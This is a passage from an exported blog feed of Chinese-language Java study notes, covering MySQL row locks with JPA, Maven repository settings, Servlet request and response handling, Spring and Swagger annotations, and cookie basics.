<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.行级锁，大家一定都听到过，也肯定比较喜欢。对于mysql，InnoDB预设的是Row-level Lock，但是，需要明确的指定主键，才会执行行级锁，否则执行的为表锁。</span><br><span class="line"></span><br><span class="line">比如：</span><br><span class="line"></span><br><span class="line">select * from job_info where id = 1 for update;  </span><br><span class="line"></span><br><span class="line">那么上面这句，为行级锁。</span><br><span class="line"></span><br><span class="line">而 select * from job_info where job_name = &apos;test&apos; for update;</span><br><span class="line"></span><br><span class="line">这句，就变成了表锁了。。。。（我当时泪也流干了，各种查DB引擎，命令行测试，多亏了(http://blog.sina.com.cn/s/blog_88d2d8f501011sgl.html  MySQL中select * for update锁表的问题) 这篇文章）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">那么好，现在关于如何才能让mysql执行行级锁的问题解决了。。。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.jpa如何搞 select for update。</span><br><span class="line"></span><br><span class="line">也是醉了，在Dao层的方法上，要配置Lock的注解。并且要加上LockModeType.PESSIMISTIC_WRITE ，这个就相当于for update了。大家也可以在程序运行时，打印出的sql中看到。 这个东东，得益于 (http://suene.iteye.com/blog/1756295  Spring Data JPA,基础学习笔记.) 该文章。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">至此呢，终于解决掉了行级锁和jpa注解实现  for update 的问题。。。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">注：这里写注呢，是因为前面的demo代码里，也有坑的。。大家应该也能注意到了，在Dao层中，getJobByNameForUpdate 这个方法千万不要用哦！它可是会导致锁表的哦！</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>jvm</tag>
      </tags>
  </entry>
  <entry>
    <title>java-maven</title>
    <url>/java-maven/</url>
    <content><![CDATA[<h2 id="pom-文件"><a href="#pom-文件" class="headerlink" title="pom 文件"></a>pom 文件</h2><h3 id="pom中配置maven仓库"><a href="#pom中配置maven仓库" class="headerlink" title="pom中配置maven仓库"></a>pom中配置maven仓库</h3><p>配置maven仓库，可以在maven的settings.xml里改。优点是全局统一配置，缺点是不受你项目git管理。<br>也可以直接在pom.xml里改, 好处就是 可以受git管理，缺点是每个项目的pom你都得配置。</p>
<p>maven自动下载依赖时，会涉级读取三个配置文件，分别是项目下的pom.xml 文件 、家目录下的.m2/settings.xml 与 maven 全局配置settings.xml ，后面两者不难理解，就像linux下的用户一样，有一个/etc/profile ，用户用目录下还有一个.bash_profile 文件是一样的，用户自定义配置会覆盖全局配置。<br><a id="more"></a><br>三者的级先是 pom.xml &gt; /home_dir/.m2/settings.xml &gt; /maven_dir/conf/settings.xml 。</p>
<p>总结： 相对来说，在pom中配置maven仓库比较好，项目代码放到哪都没有问题。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;repositories&gt;</span><br><span class="line">    &lt;repository&gt;</span><br><span class="line">        &lt;id&gt;aliyun&lt;/id&gt;</span><br><span class="line">        &lt;url&gt;https://maven.aliyun.com/repository/public&lt;/url&gt;</span><br><span class="line">        &lt;releases&gt;</span><br><span class="line">            &lt;enabled&gt;true&lt;/enabled&gt;</span><br><span class="line">        &lt;/releases&gt;</span><br><span class="line">        &lt;snapshots&gt;</span><br><span class="line">            &lt;enabled&gt;false&lt;/enabled&gt;</span><br><span class="line">        &lt;/snapshots&gt;</span><br><span class="line">    &lt;/repository&gt;</span><br><span class="line">&lt;/repositories&gt;</span><br><span class="line">&lt;pluginRepositories&gt;</span><br><span class="line">    &lt;pluginRepository&gt;</span><br><span class="line">        &lt;id&gt;aliyun-plugin&lt;/id&gt;</span><br><span class="line">        &lt;url&gt;https://maven.aliyun.com/repository/public&lt;/url&gt;</span><br><span class="line">        &lt;releases&gt;</span><br><span class="line">            &lt;enabled&gt;true&lt;/enabled&gt;</span><br><span class="line">        &lt;/releases&gt;</span><br><span class="line">        &lt;snapshots&gt;</span><br><span class="line">            &lt;enabled&gt;false&lt;/enabled&gt;</span><br><span class="line">        &lt;/snapshots&gt;</span><br><span class="line">    &lt;/pluginRepository&gt;</span><br><span class="line">&lt;/pluginRepositories&gt;</span><br></pre></td></tr></table></figure>
<p>注意： pluginRepositories配置容易被忽略，pluginRepositories用来配置maven插件的远程仓库，注意如上也需要配置。否则只有项目本身的依赖，走了aliyun这个repository，maven命令需要的插件（比如clean、install都是maven的插件），走的还是默认的repository。</p>
]]></content>
      <categories>
        <category>maven</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>maven</tag>
        <tag>maven 构建</tag>
        <tag>pom.xml</tag>
      </tags>
  </entry>
  <entry>
    <title>java-web-Servlet</title>
    <url>/java-web-Servlet/</url>
    <content><![CDATA[<h2 id="Servlet的入门"><a href="#Servlet的入门" class="headerlink" title="Servlet的入门"></a>Servlet的入门</h2><h3 id="1-Servlet的接口和实现类："><a href="#1-Servlet的接口和实现类：" class="headerlink" title="1.Servlet的接口和实现类："></a>1.Servlet的接口和实现类：</h3><p>Servlet它是一个接口，在javax.servlet 包下面。</p>
<h4 id="五个方法："><a href="#五个方法：" class="headerlink" title="五个方法："></a>五个方法：</h4><ul>
<li>destory（）：执行这个方法，销毁了servlet对象</li>
<li>init（ServletConfig config）：在web服务器创建servlet对象以后，执行这个初始化方法。</li>
<li>service（ServletRequest req，ServletResponse res）：服务方法，用来接收客户端发送的请求，并且响应数据到</li>
<li>getServletConfig（）：现在不讲</li>
<li>getServletInfo（）：servlet的信息，比如作者、版本和版权，这个方法在开发中不用。<br>Genericservlet，它是一个类，实现了Servlet接口<br>Httpservlet，它是一个类，实现了Servlet接口，同时继承了GenerciServlet<a id="more"></a>
<h4 id="创建servlet三种方式"><a href="#创建servlet三种方式" class="headerlink" title="创建servlet三种方式"></a>创建servlet三种方式</h4></li>
</ul>
<ul>
<li>直接实现Servlet接口。</li>
<li>继承HttpServlet类。</li>
<li>一般在开发中，创建servlet，通常去继承这个HttpServlet.<br>比如：class MyServlet extends HttpServlet{重写咱们所需要的方法}</li>
</ul>
<h4 id="Servlet的生命周期："><a href="#Servlet的生命周期：" class="headerlink" title="Servlet的生命周期："></a>Servlet的生命周期：</h4><p>生命周期：自然界人从出生到最终走向西方极乐世界，这个周期过程就是生命周期，其实servlet的生命周期和人的一样，从servlet对象被创建，经过使用servlet对象，到最终servlet对象被销毁，整个过程就是servlet的生命周期。</p>
<h5 id="与生命周期相关的三个方法："><a href="#与生命周期相关的三个方法：" class="headerlink" title="与生命周期相关的三个方法："></a>与生命周期相关的三个方法：</h5><ul>
<li>init（ServletConfig config）初始化方法：首次访问这个Servlet，servlet对象会被创建，执行初始化方法。</li>
<li>service（ServletRequest req，ServletResponse res）服务方法：每次访问servlet时，服务方法都会被执行。</li>
<li>destroy（）销毁方法：在服务器正常关闭时。会执行销毁方法，执行一次。</li>
</ul>
<h5 id="Servlet应用-HttpServlet"><a href="#Servlet应用-HttpServlet" class="headerlink" title="Servlet应用-HttpServlet"></a>Servlet应用-HttpServlet</h5><ul>
<li>在开发中，通常浏览器访问web服务器端的资源，是带有协议的访问，比如说http协议、https协议等，所以说在创建servlet时。需要使用带有协议的servlet，那么咱们程序员在创建servlet时，通常用继承HttpServlet的方式来实现。</li>
<li><ul>
<li>1.查看HttpServlet源码得到的结论：<br>在HttpServlet里面重写service方法时，因为在service方法里面，最终调用doGet或者doPost方法，所以说在重写服务方法时，一般情况下不会重写service方法，而是直接重写doGet和doPost方法在客户端发送get请求，在服务器端就用doGet方法接收、在客户端发送Post请求，在服务器端就用doPost方法来接收</li>
</ul>
</li>
<li>在开发中，注意的细节：</li>
<li><ul>
<li>1.在使用对象时，使用带有协议的请求和响应对象HttpServletRequset和HttpServletResponse</li>
</ul>
</li>
<li><ul>
<li>2.在开发时，继承HttpServlet是，直接重写doGet和doPost方法，而不是重写service方法了</li>
</ul>
</li>
</ul>
<p><img data-src="https://upload-images.jianshu.io/upload_images/6407592-26fed837b1400026.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="servlet1"></p>
<h5 id="实现Servlet的虚拟路径映射"><a href="#实现Servlet的虚拟路径映射" class="headerlink" title="实现Servlet的虚拟路径映射"></a>实现Servlet的虚拟路径映射</h5><ul>
<li><p>1.Servlet的多重映射：一个Servlet，可以对应多个访问路径。比如：一个servlet对应的访问路径：/testo2或者/testo3</p>
</li>
<li><p>2.Servlet的映射路径可以使用通配符servlet的映射路径有三种方式：、<br>完全目录匹配：比如/hello<br>目录匹配：比如/abc/<em>或者/</em><br>扩展名匹配：<em>.do，</em>.action 注意/*.do这种写法是错误的。<br>优先级：完全目录匹配&gt;目录匹配&gt;扩展名匹配</p>
</li>
<li>3.缺省Servlet什么是缺省Servlet：它的映射路径“/”，代表这是一个缺省的servlet.<br>缺省的servelt作用：处理请求的资源找不到的问题（404代表请求的资源找不到）</li>
</ul>
<h5 id="ServletConfig接口"><a href="#ServletConfig接口" class="headerlink" title="ServletConfig接口"></a>ServletConfig接口</h5><p>什么是servletConfig：它是servlet的配置对象，作用就是获取与servlet的初始化参数。<br>它的子类是GenericServlet和HttpServlet.<br>它被实列化通过web服务器实现的。<br>得到servletconfig对象：getServletConfig（）</p>
<h6 id="ServletConfig常用的方法："><a href="#ServletConfig常用的方法：" class="headerlink" title="ServletConfig常用的方法："></a>ServletConfig常用的方法：</h6><ul>
<li>1.获取servlet的初始化参数的值：getInitParameter（String name）</li>
<li>2.获取servlet初始化参数的名称：getInitParameterNames（）</li>
<li>3.得到servletContext对象：getServletContext（）</li>
<li>4.获取servlet的名称：getservletName（）</li>
</ul>
<h5 id="ServletContext接口"><a href="#ServletContext接口" class="headerlink" title="ServletContext接口"></a>ServletContext接口</h5><p>ServletContext对象是在web服务器启动时就创建了，是web服务器创建的servletcontext对象，每一个web项目只有一个ServletContext对象。<br>ServletContext对象的作用：获取web应用程序的初始化参数，在web应用程序能共享数据，获取web项目下的资源文件。<br>得到ServletContext对象：</p>
<ul>
<li>1.通过ServletConfig对象：config.getservletContext（）</li>
<li>2.直接得到：getservletContext（）；<h6 id="获取web应用程序的初始化参数（web应用程序就是web项目）"><a href="#获取web应用程序的初始化参数（web应用程序就是web项目）" class="headerlink" title="获取web应用程序的初始化参数（web应用程序就是web项目）"></a>获取web应用程序的初始化参数（web应用程序就是web项目）</h6></li>
<li>1.获取全局初始化参数的值：getInitParameter（String name）：</li>
<li>2.获取全局初始化参数的名称：getInitParameterNames（）</li>
<li>3.获取Web下面的资源文件</li>
<li><ul>
<li>通过Servletcontext对象能够获取Web项目下面文件的字节输入流，或者文件的绝对路径。</li>
</ul>
</li>
<li><ul>
<li>路径问题：</li>
</ul>
</li>
<li><ul>
<li>普通java项目：直接使用jdk编译java文件，所以说文件的路径是相对于工作空间。<br><img data-src="https://upload-images.jianshu.io/upload_images/6407592-9a03c6c21bded0aa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="javaputong wenjai duqu lujing"></li>
</ul>
</li>
<li><ul>
<li>web项目：运行在tomcat服务器上面的，所有说文件的路径是相对于tomcat服务器。<br>服务器端是没有src这个目录，写路径不能写src，必须相对于tomcat服务器端的路经。<br>1.获取文件的自己输入流：路径是相对于tomcat服务器的路径<br>Inputstream in =getResourceAsStream（String path）<br><img data-src="https://upload-images.jianshu.io/upload_images/6407592-cdfa95c0d25f777d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>2.获取文件的绝对路径：路径是相对于服务器端的路径<br>String realPath=getRealPath（path）<br><img data-src="https://upload-images.jianshu.io/upload_images/6407592-58d9228ba65e475e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li>
</ul>
</li>
</ul>
<p><img data-src="https://upload-images.jianshu.io/upload_images/6407592-89b7d454ac735081.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
<p><img data-src="https://upload-images.jianshu.io/upload_images/6407592-166d7cb470544263.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
]]></content>
      <categories>
        <category>java web</category>
      </categories>
      <tags>
        <tag>java web</tag>
        <tag>入门</tag>
        <tag>Servlet</tag>
      </tags>
  </entry>
  <entry>
    <title>java-web 之请求与响应学习</title>
    <url>/java-web-%E4%B9%8B%E8%AF%B7%E6%B1%82%E4%B8%8E%E5%93%8D%E5%BA%94%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>HttpServletResponse是一个接口，它的父接口是ServletResponse，在开发中通常使用HttpServletResponse响应信息分为三部分：响应行、响应头、响应正文（响应体）</p>
<h3 id="1-1发送状态码的相关方法："><a href="#1-1发送状态码的相关方法：" class="headerlink" title="1.1发送状态码的相关方法："></a>1.1发送状态码的相关方法：</h3><h4 id="1-设置状态码"><a href="#1-设置状态码" class="headerlink" title="1.设置状态码"></a>1.设置状态码</h4><p>setStatus（int sc）：参数就是状态码。<br>setstatus（int sc，String sm）：第一个参数表示状态码，第二个参数就状态码的描述。</p>
<h5 id="常见的状态码：200响应成功"><a href="#常见的状态码：200响应成功" class="headerlink" title="常见的状态码：200响应成功"></a>常见的状态码：200响应成功</h5><p>302重定向<br>404请求资源找不到<br>500服务器代码出异常。<br><a id="more"></a></p>
<h4 id="2-错误信息方法："><a href="#2-错误信息方法：" class="headerlink" title="2.错误信息方法："></a>2.错误信息方法：</h4><p>sendError（int sc）：参数状态码<br>sendError（int sc，String sm）：第一个参数表示状态码，第二个参数就状态码的描述。</p>
<h3 id="1-2发送响应消息头相关的方法："><a href="#1-2发送响应消息头相关的方法：" class="headerlink" title="1.2发送响应消息头相关的方法："></a>1.2发送响应消息头相关的方法：</h3><p>响应消息头的数据格式：key-value的形式，有的是一个key，一个value，有的是一个key，多个value</p>
<p><img data-src="https://upload-images.jianshu.io/upload_images/6407592-cf4c076bfe44fa8f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
<h4 id="1-设置响应消息头："><a href="#1-设置响应消息头：" class="headerlink" title="1.设置响应消息头："></a>1.设置响应消息头：</h4><ul>
<li>一个key，一个value<br>setHeader（String key，String value）；<br><img data-src="https://upload-images.jianshu.io/upload_images/6407592-8a6590eda81f6db6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li>
</ul>
<ul>
<li>一个key，对应多个value<br>addHeader（String key，String value）；<br><img data-src="https://upload-images.jianshu.io/upload_images/6407592-75c981fefcc29aff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li>
</ul>
<h4 id="2-设置响应数据的长度：setContentLength（int-src）方法"><a href="#2-设置响应数据的长度：setContentLength（int-src）方法" class="headerlink" title="2.设置响应数据的长度：setContentLength（int src）方法"></a>2.设置响应数据的长度：setContentLength（int src）方法</h4><h4 id="3-设置处理乱码的方法："><a href="#3-设置处理乱码的方法：" class="headerlink" title="3.设置处理乱码的方法："></a>3.设置处理乱码的方法：</h4><ul>
<li>setCharacterEncoding（String a）；参数就是一个码表格式，比如：“utf-81</li>
<li>setContentType（String a）；参数代表响应数据的类型和码表格式，比如：“text/html；charset=utf-8”</li>
</ul>
<p>结论：在处理字符流和字节流输出中文乱码时，都采用response.setContentType（<br>注意：常见的编码格式：<br>GBKGB18030GB2312都是支持中文的编码格式，当然支持其它一些字符。<br>UTF-8：万能码表格式，支持所有的字符。<br>ISO-8859-1：不支持中文。</p>
<h3 id="1-3-HttpServletRequest请求对象"><a href="#1-3-HttpServletRequest请求对象" class="headerlink" title="1.3.HttpServletRequest请求对象"></a>1.3.HttpServletRequest请求对象</h3><p>HttpServletRequest它是一个接口，它的父接口ServletRequest，在开发中，常用的是带协议的请求对象。<br>请求消息：请求行，请求头，请求参数。</p>
<h4 id="1-获取请求行消息的相关方法："><a href="#1-获取请求行消息的相关方法：" class="headerlink" title="1.获取请求行消息的相关方法："></a>1.获取请求行消息的相关方法：</h4><p>常用的请求行方法：</p>
<ul>
<li>1.获取请求提交的方式：getMethod（）；&gt;&gt;&gt;2.获取请求的协议：getProtocol（）；</li>
<li>3.获取项目名称：getcontextPath（）；</li>
<li>4.获取servlet路径：getServletPath（）；</li>
<li>5.获取请求路径：getRequsetuRI（），getRequestURL（）<h4 id="2-获取请求消息头相关的方法"><a href="#2-获取请求消息头相关的方法" class="headerlink" title="2.获取请求消息头相关的方法"></a>2.获取请求消息头相关的方法</h4></li>
<li>1.根据消息头，获取值：String value=getHeader（消息头的名称）； </li>
<li>2.获取所有的消息头：Enumeration er=getHeaderNames（）；根据Referer请求消息头，做一个防盗链的案例：<br><img data-src="https://upload-images.jianshu.io/upload_images/6407592-5625075462ed9fa7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="防盗链"></li>
<li><ul>
<li>难点：怎么判断这个发起的下载请求是从别的网站上发起的？<br>解决方法：根据Referer请求头对应的值，是否包含了服务器的名称如果包含，就说明是从本网站下载的，否则就不是。<h4 id="3-获取请求参数相关的方法："><a href="#3-获取请求参数相关的方法：" class="headerlink" title="3.获取请求参数相关的方法："></a>3.获取请求参数相关的方法：</h4></li>
</ul>
</li>
<li>1.根据name属性值，获取用户输入的值：string value=getParameter（name属性对应的值）；</li>
<li>2.根据name属性值，获取用户选择的值：String[]vaules=getParameterValues（name属性对应的值）；</li>
<li>3.没有参数，获取所有值：Map&lt;String，String[]&gt;map=getParameterMap（）；<h4 id="4-解请求参数的中文乱码问题："><a href="#4-解请求参数的中文乱码问题：" class="headerlink" title="4.解请求参数的中文乱码问题："></a>4.解请求参数的中文乱码问题：</h4>中文乱码处理分两种情况：</li>
<li>第一种情况：处理get方式提交的中文乱码<br>使用的String的构造方法解决的中文乱码：new String（字节数组，编码格式）；<br>代码：<br>String nevalue=new String（value.getBytes（”IS08859-1”），”utf-8”）；</li>
<li>第二种情况：处理post请求的中文乱码问题：<br>post提交，会把参数首先提交到request对象的缓冲区中，缓冲区默认编码是IS08859-1，不支持中文处理方法：把request缓冲区的编码给设置成支持中文的码表格式。<br>代码：<br>request.setCharacterEncoding（”utf-8”）；</li>
</ul>
<h4 id="5-通过Requset对象传递数据"><a href="#5-通过Requset对象传递数据" class="headerlink" title="5.通过Requset对象传递数据"></a>5.通过Requset对象传递数据</h4><p>什么域对象：在一定的范围内，可以存值和取值。<br>request域对象：在一次请求中，可以存值和取值。</p>
<ul>
<li>存值：setAttribute（String key，Object obj）；&gt;&gt;&gt;取值：Object obj=getAttribyte（String key）；</li>
<li>移除：removeAttribute（String key）；<h3 id="1-4-RequestDispatcher接口"><a href="#1-4-RequestDispatcher接口" class="headerlink" title="1.4 RequestDispatcher接口"></a>1.4 RequestDispatcher接口</h3>在开发中访问到一个web资源后，需要服务器跳转到另一个资源去处理请求，可以通过sendRedirect重定向方法来实现，也可以RequestDispatcher转发对象的forward方法来实现。<br>得到转发对象：<br>RequestDispatcher forwardobj=request.getRequestDispatcher（”另一个资源的路径”）；<br>常用方法：</li>
<li>1.实现请求转发：forwardObj.forward（request，response）；</li>
<li><p>2.实现请求包含：forwardobj.include（request，response）；</p>
</li>
<li><p>1.请求转发：<br>特点：发送了一次请求，响应一次，和request域对象配合使用，可以实现值得传递。<br>转发路径：转发动作是在服务器内部实现的，所以转发路径不要携带项目名称。</p>
</li>
<li><ul>
<li>2.请求重定向：<br>特点：发送了两次请求，响应了两次，不能喝request域对象配合使用。<br>重定向路径：重定向动作在浏览器端执行的，所以路径需要携带项目名称。<br><img data-src="https://upload-images.jianshu.io/upload_images/6407592-742a0aaaf9100a4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li>
</ul>
</li>
<li><p>2.请求包含：<br>特点：发送一次请求，请求包含是由服务器完成。<br>请求包含路径：在服务器内部完成的，路径不需要携带项目名称。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>java web</category>
      </categories>
      <tags>
        <tag>java web</tag>
        <tag>请求与相应</tag>
      </tags>
  </entry>
  <entry>
    <title>java-spring</title>
    <url>/java-spring/</url>
    <content><![CDATA[<h2 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h2><h3 id="ApiOperation注解说明"><a href="#ApiOperation注解说明" class="headerlink" title="@ApiOperation注解说明"></a>@ApiOperation注解说明</h3><p>首先@ApiOperation注解不是Spring自带的，它是是swagger里的<br>注解@ApiOperation是用来构建Api文档的<br>@ApiOperation(value = “接口说明”, httpMethod = “接口请求方式”, response =<br>“接口返回参数类型”, notes = “接口发布说明”；其他参数可参考源码；</p>
<h3 id="PostMapping"><a href="#PostMapping" class="headerlink" title="@PostMapping"></a>@PostMapping</h3><p>映射一个POST请求<br>Spring MVC新特性<br>提供了对Restful风格的支持<br><a id="more"></a><br>@GetMapping，处理get请求<br>@PostMapping，处理post请求<br>@PutMapping，处理put请求<br>@DeleteMapping，处理delete请求<br>@PatchMapping,<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@PostMapping(value = &quot;/user/login&quot;)</span><br><span class="line">等价于</span><br><span class="line">@RequestMapping(value = &quot;/user/login&quot;,method = RequestMethod.POST)</span><br></pre></td></tr></table></figure></p>
<h3 id="ApiImplicitParams、ApiImplicitParam"><a href="#ApiImplicitParams、ApiImplicitParam" class="headerlink" title="ApiImplicitParams、ApiImplicitParam"></a>ApiImplicitParams、ApiImplicitParam</h3><p>在开发过程中，我们会使用到swagger,其中有许多的注解，这里介绍一下注解@ApiImplicitParams </p>
<p>注解功能：备注入参的中英文名称，配置必读、参数形式等,如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@ApiImplicitParams(&#123;</span><br><span class="line">@ApiImplicitParam(value = &quot;Id&quot;, name = &quot;Id&quot;, required = true, dataType = &quot;String&quot;, paramType = &quot;query&quot;),</span><br><span class="line">@ApiImplicitParam(value = &quot;名称&quot;, name = &quot;name&quot;, required = true, dataType = &quot;String&quot;, paramType = &quot;query&quot;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>其中内部参数功能：<br>value :备注输入参数名称（中文）<br>name：备注输入参数名称（英文）<br>required ：该入参是否必填<br>dataType:该入参的数据类型<br>paramType  ：前台接口调用时url 参数形式</p>
<p>如：query 的形式：getUser?user =admin<br>      path的形式：getUser/user/admin</p>
<h3 id="Controller、-Service、-Repository、-RestController"><a href="#Controller、-Service、-Repository、-RestController" class="headerlink" title="@Controller、@Service、@Repository、@RestController"></a>@Controller、@Service、@Repository、@RestController</h3><p>Spring 2.5 在 @Repository的基础上增加了功能类似的额外三个注解：@Component、@Service、@Constroller，它们分别用于软件系统的不同层次：</p>
<p>@Component 是一个泛化的概念，仅仅表示一个组件 (Bean) ，可以作用在任何层次。<br>@Service 通常作用在业务层，但是目前该功能与 @Component 相同。<br>@Constroller 通常作用在控制层，但是目前该功能与 @Component 相同。</p>
<p>@Controller 控制器（注入服务）<br>用于标注控制层，相当于struts中的action层<br>@Service 服务（注入dao）<br>用于标注服务层，主要用来进行业务的逻辑处理<br>@Repository（实现dao访问）<br>用于标注数据访问层，也可以说用于标注数据访问组件，即DAO组件<br>@Component （把普通pojo实例化到spring容器中，相当于配置文件中的 ）<br>泛指各种组件，就是说当我们的类不属于各种归类的时候（不属于@Controller、@Services等的时候），我们就可以使用@Component来标注这个类。</p>
<p>Spring的注解形式：@Repository、@Service、@Controller，它们分别对应存储层 Bean，业务层 Bean，和展示层 Bean。</p>
<p>@Repository注解修饰哪个类，则表明这个类具有对对象进行CRUD（增删改查）的功能，而且@Repository是@Component注解的一个派生品，所以被 @Repository注解的类可以自动的被 @ComponentScan 通过路径扫描给找到。（这也在一定程度上解释了，为什么被 @Repository注解的类也能 @Autowired）</p>
<h4 id="Controller和-RestController的区别？"><a href="#Controller和-RestController的区别？" class="headerlink" title="@Controller和@RestController的区别？"></a>@Controller和@RestController的区别？</h4><p>官方文档：<br>@RestController is a stereotype annotation that combines @ResponseBody and @Controller.<br>意思是：<br>@RestController注解相当于@ResponseBody ＋ @Controller合在一起的作用。</p>
<p>1)如果只是使用@RestController注解Controller，则Controller中的方法无法返回jsp页面，配置的视图解析器InternalResourceViewResolver不起作用，返回的内容就是Return 里的内容。</p>
<p>例如：本来应该到success.jsp页面的，则其显示success.<br>2)如果需要返回到指定页面，则需要用 @Controller配合视图解析器InternalResourceViewResolver才行。<br>3)如果需要返回JSON，XML或自定义mediaType内容到页面，则需要在对应的方法上加上@ResponseBody注解。</p>
<h3 id="Autowired"><a href="#Autowired" class="headerlink" title="@Autowired"></a>@Autowired</h3><p>@Autowired 注释，它可以对类成员变量、方法及构造函数进行标注，完成自动装配的工作。 通过 @Autowired的使用来消除 set ，get方法。在使用@Autowired之前，我们对一个bean配置起属性时，是这用用的<br><code>&lt;property name=&quot;属性名&quot; value=&quot; 属性值&quot;/&gt;</code><br>通过这种方式来，配置比较繁琐，而且代码比较多。在Spring 2.5 引入了 @Autowired 注释</p>
<h3 id="RequestBody和-RequestParam"><a href="#RequestBody和-RequestParam" class="headerlink" title="@RequestBody和@RequestParam"></a>@RequestBody和@RequestParam</h3><h3 id="Hibernate-JPA中-Transient、-JsonIgnoreProperties、-JsonIgnore、-JsonFormat、-JsonSerialize等注解解释"><a href="#Hibernate-JPA中-Transient、-JsonIgnoreProperties、-JsonIgnore、-JsonFormat、-JsonSerialize等注解解释" class="headerlink" title="Hibernate JPA中@Transient、@JsonIgnoreProperties、@JsonIgnore、@JsonFormat、@JsonSerialize等注解解释"></a>Hibernate JPA中@Transient、@JsonIgnoreProperties、@JsonIgnore、@JsonFormat、@JsonSerialize等注解解释</h3><ul>
<li>问题由来：<br>springboot项目中定义了很多类，我们在rest返回中直接返回或者在返回对象中使用这些类，spring已经使用jackson自动帮我们完成这些的to json。但是有时候自动转的json内容太多，或者格式不符合我们的期望，因此需要调整类的to json过程，或者说希望自定义类的json过程。</li>
<li>解决办法：<br>使用@JsonIgnoreProperties、@JsonIgnore、@JsonFormat。<br>@JsonIgnore注解用来忽略某些字段，可以用在变量或者Getter方法上，用在Setter方法时，和变量效果一样。这个注解一般用在我们要忽略的字段上。<br>@JsonIgnoreProperties(ignoreUnknown = true)，将这个注解写在类上之后，就会忽略类中不存在的字段。这个注解还可以指定要忽略的字段，例如@JsonIgnoreProperties({ “password”, “secretKey” })<br>@JsonFormat可以帮我们完成格式转换。例如对于Date类型字段，如果不适用JsonFormat默认在rest返回的是long，如果我们使用@JsonFormat(timezone = “GMT+8”, pattern = “yyyy-MM-dd HH:mm:ss”)，就返回”2018-11-16 22:58:15”</li>
</ul>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><h3 id="注册登陆怎么实现的？微服务之间怎么授权的？三方授权登陆是怎么结合的？"><a href="#注册登陆怎么实现的？微服务之间怎么授权的？三方授权登陆是怎么结合的？" class="headerlink" title="注册登陆怎么实现的？微服务之间怎么授权的？三方授权登陆是怎么结合的？"></a>注册登陆怎么实现的？微服务之间怎么授权的？三方授权登陆是怎么结合的？</h3><h3 id="sessionid是怎么干啥的？你知道多少？"><a href="#sessionid是怎么干啥的？你知道多少？" class="headerlink" title="sessionid是怎么干啥的？你知道多少？"></a>sessionid是怎么干啥的？你知道多少？</h3>]]></content>
      <categories>
        <category>Spring</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>java-web-会话及其会话技术</title>
    <url>/java-web-%E4%BC%9A%E8%AF%9D%E5%8F%8A%E5%85%B6%E4%BC%9A%E8%AF%9D%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h2 id="1-会话概述："><a href="#1-会话概述：" class="headerlink" title="1.会话概述："></a>1.会话概述：</h2><ul>
<li>什么是会话：从打开浏览器，到访问网页，到最终关闭浏览器，整个过程就是一次会话。</li>
<li>会话的特点：包含多个请求，一次完整的会话针对一个用户。<h3 id="会话管理技术："><a href="#会话管理技术：" class="headerlink" title="会话管理技术："></a>会话管理技术：</h3>第一种：cookie技术，客户端技术。第二种：session技术，服务端技术。<br>购物车案列：买完商品后，加入购入车，买的商品存到什么对象比较合适？</li>
<li>1.使用request域对象保存商品信息：<br>结论：使用request保存商品信息不可以，因为每次发送请求，都会产生一个新的请求对象。</li>
<li>2.使用ServletContext域对象保存商品信息结论：使用Servletcontext对象保存商品信息，可以，但是不合理。<br>所以在开发中，保存会话过程中产生的数据，采用会话管理技术，也就是使用cookie和session技术来保存会话过程产生的数据。<a id="more"></a>
<h2 id="2-Cookie对象"><a href="#2-Cookie对象" class="headerlink" title="2.Cookie对象"></a>2.Cookie对象</h2><h3 id="1-1什么是cookie："><a href="#1-1什么是cookie：" class="headerlink" title="1.1什么是cookie："></a>1.1什么是cookie：</h3>Cookie是一种会话管理技术，它是用来保存会话过程中产生的数据，然后在浏览器和服务器交互时，会使用cookie里面保存的数据<br>注意：首次访问服务器，浏览器不会携带cookie到服务端。<h3 id="1-2Cookie常用的api"><a href="#1-2Cookie常用的api" class="headerlink" title="1.2Cookie常用的api"></a>1.2Cookie常用的api</h3></li>
<li>1.得到cookie对象：Cookie cookie=new Cookie（String key，String value）；</li>
<li>2.回写（响应）cookie到浏览器端：response.addCookie（cookie）；</li>
<li>3.得到cookie的名称：String key=cookie.getName（），得到cookie的值：String value=cookie.getValue（）；</li>
<li>4.给cookie设置生命时长：setMaxAge（int sr）；比如：cookie.setMaxAge（60<em>60</em>24*7），说明cookie能存活7天；cookie分类：<br>第一类：会话级别cookie，浏览器关闭，cookie对象就销毁了。第二类：持久化cookie，通过setMaxAge这个方法来设置。</li>
